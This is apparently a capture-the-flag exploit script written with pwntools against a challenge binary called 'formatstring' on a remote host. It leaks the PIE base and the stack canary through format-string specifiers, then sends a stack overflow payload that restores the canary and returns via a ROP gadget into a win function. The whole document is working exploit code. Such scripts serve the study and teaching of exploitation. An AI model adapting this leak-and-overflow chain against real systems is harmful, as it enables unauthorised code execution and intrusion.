from pwn import *
context.log_level='debug'

HOST = "alpha.8059blank.ml"
PORT = 3002
p = remote(HOST, PORT)
BINARY = './formatstring'
elf = context.binary = ELF(BINARY)
#p = process(BINARY)

p.sendlineafter("Let's leak the PIE offset first.\n", flat("%45$p"))
pie_main = int(p.recvline(keepends=False),16)

log.info(f"pie main at {hex(pie_main)}")
log.info(f"main symbol at {hex(elf.sym.main)}")
elf.address = pie_main - elf.sym.main
log.success(f"pie at {hex(elf.address)}")

p.sendlineafter("How about the canary?\n", flat("%39$p"))
canary = int(p.recvline(keepends=False),16)
log.success(f"canary is {hex(canary)}")

rop = ROP(elf)
p.sendlineafter("Now you've got everything you need!", flat(
	b"A"*264,
	canary,
	b"A"*8,
	rop.ret.address,
	elf.sym.win
))
p.interactive()
